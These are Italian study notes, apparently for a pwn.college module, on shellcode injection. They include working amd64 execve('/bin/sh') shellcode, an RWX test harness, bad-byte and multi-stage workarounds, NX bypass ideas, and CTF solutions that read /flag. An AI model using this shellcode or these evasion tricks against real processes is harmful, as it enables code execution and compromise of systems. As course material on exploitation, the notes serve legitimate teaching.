+++
title = "Mod 4: Shellcode Injection"
+++

## Appunti lezioni

{{< attachments />}}

### Intro

Come abbiamo visto negli scorsi moduli i processori moderni seguono l'architettura Von Neumann.
L'architettura Harvard separa la memoria eseguibile dalla memoria in lettura/scrittura (__TODO:__ cercare perchè/cenni storici).
Perchè facciamo notare questa differenza? Perchè in un arch Von Neumann è possibile fare _shellcode injection_, ovvero redirezionare l'esecuzione di un processo in modo arbitrario, inserendo come input al programma le istruzioni binarie da eseguire.

### Come si arriva a poter usare una shellcode injection

Si tratta quasi sempre di bug introdotti dal programmatore (esempio fatto a lezione, trattare un buffer di char al posto di un puntatore di funzione. Vabbè sto esempio fa un po' schifo, visto che il sistema di tipi dovrebbe mettersi in mezzo a compile time).

### Shellcode?

Un pezzo di software, in codice macchina, che fai eseguire al processo che stai attaccando.
Chiamato "shell"code perchè normalmente lo scopo è avere una shell sulla macchina compromessa.
Lo shellcode per avere una shell su amd64 linux è il seguente:

```
mov rax, 59             # this is the syscall number of execve
lea rdi, [rip+binsh]    # points the first argument of execve at the /bin/sh string below
mov rsi, 0              # this makes the second argument, argv, NULL
mov rdx, 0              # this makes the third argument, envp, NULL
syscall                 # this triggers the system call
binsh:                  # a label marking where the /bin/sh string is
.string "/bin/sh"
```

Ovviamente, può essere usato per fare qualsiasi cosa, non solo aprire shell.

### Fast prototyping

* Compilare shellcode in ELF:

```
.global _start
_start:
.intel_syntax noprefix
<inserire shellcode>

$ gcc -N -nostdlib -static shellcode.s -o shellcode-elf
```

* va poi estratta la parte interessante per usarlo nell'exploit (aka `.text`)
* Creare un programma C che prende shellcode in input, per simulare la situazione trovata nel processo da esploitare

```c
page = mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
read(0, page, 0x1000);
((void(*)())page)();
```

* ovviamente puoi sempre usare strace e i debugger
  * si può assemblare lasciando i simboli di debug (non ci sono ripercussioni su `.text`)
  * spesso è utile inserire `int3` direttamente nel shellcode
* qemu per archittetture diverse da amd64

### Problemi tipicamente riscontrati

* Bisogna stare attenti alle dimensioni dei dati spostati. Gli assembler ti permettono di specificarlo se necessario.
* Spesso ti ritrovi a non poter usare alcuni byte, a seconda del mezzo con cui comunichi con il process (ie `\n`). Ecco alcune possibili soluzioni:
  * riscrivere lo shellcode in per fargli avere la stessa semantica
  ie: `mov rax, 10 (48c7c00a000000)` si può riscrivere come `mov rax, 9; inc rax (48C7C00900000048FFC0)`
    * ci sono tool automatici, ma ogni tanto si rompono e diventa difficile capire cosa stia succedendo (il dudo sconsiglia di usarli)
  * salvare il codice (con i byte vietati modificati) come data, ripristinare i byte necessari e poi eseguirlo
  * fare uno shellcode multi-stage, dove il primo stage esegue semplicemente una read verso `[rip]`, e il resto dello shellcode viene iniettato dopo
* shellcode può essere modificato in modo strano prima di essere eseguito, qui la soluzione deve essere ad-hoc

### Protezione: No-eXecute

Il sistema operativo riesce a mitigare __quasi__ tutti i casi in cui lo shellcode ci permette di exploitare roba.
In pratica le pagine il kernel decide quali pagine di memoria hanno i permessi di essere eseguiti, e normalmente non assegna permessi di scrittura e esecuzione alla stessa pagina.
Per poter eseguire lo shellcode, le soluzioni possono essere le seguenti:

* usare altri metodi per usare la syscall `mprotect` e rendere eseguibile la pagina scrivibile
* accedere ad una pagina che ha già i permessi `wx`, queste si trovano tipicamente nello spazio di memoria dei compilatori JIT, dato che hanno bisogno di compilare ed eseguire on the fly
  * JIT spraying (__non ho ben capito cosa sia__, ma non credo sia nello scope di pwncollege)
* molti sistemi embedded non implementano NX

#### Approfondimento sull'implementazione di NX

[Il sistema è gestito a livello di pagine di memoria](https://wiki.osdev.org/Paging)
Niente, in realtà non ho capito
Forse mi aiuta capire come funziona [pae](https://it.wikipedia.org/wiki/Physical_Address_Extension)

## Altre risorse

* <https://www.cs.fsu.edu/~langley/CNT5605/2017-Summer/assembly-example/assembly.html>
* <https://filippo.io/linux-syscall-table/>

## Challenges

### 1

```assembly
        mov rax, 2
        lea rcx, [rip+.after_open]
        lea rdi, [rip+.flag_filename]
        xor rsi, rsi
        syscall
        .after_open:

        mov rdi, rax

        mov rax, 0
        lea rcx, [rip+.after_read]
        lea rsi, [rip+.buffer]
        mov rdx, 0x99
        syscall
        .after_read:

        mov rax, 1
        lea rcx, [rip+.after_write]
        mov rdi, 1
        lea rsi, [rip+.buffer]
        mov rdx, 0x99
        syscall
        .after_write:

        ret

        .flag_filename:
        .string "/flag"
        .buffer:
        .space 0x100
```

### 2

Uso `space` (visto prima) per inizializzare 0x90 (`nop`) per 0x800 byte

### 3

Ez, basta lavorare un po' con gli indirizzi e fare sottrazioni dove serve

### 4

```
        .macro .my_deref reg, lowreg, label
        call .push_rip
        pop \reg
        add \lowreg, \label - . + 1
        .endm
```

che chiama

```
        .push_rip:
        pop r11
        push r11
        push r11
        ret
```
